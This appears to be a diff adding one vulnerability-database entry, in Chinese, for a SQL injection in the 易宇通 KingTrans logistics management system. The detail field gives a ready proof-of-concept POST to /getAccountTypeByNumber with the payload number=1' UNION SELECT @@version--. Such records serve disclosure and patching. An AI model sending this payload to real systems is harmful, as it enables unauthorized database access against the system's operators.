@@ -1,0 +1,13 @@
+vendor = "易宇通"
+name = "易宇通 KingTrans 物流管理系统 getAccountTypeByNumber SQL注入漏洞"
+type = "SQL注入"
+path = "/getAccountTypeByNumber"
+version = ""
+detail = """POST /getAccountTypeByNumber HTTP/1.1 Host: target Content-Type: application/x-www-form-urlencoded
+
+number=1' UNION SELECT @@version--"""
+fix = "联系厂商获取补丁"
+date = 20260415
+label = "nday"
+cve = "TVD-2026-08724"
+verifier = "AdySec"
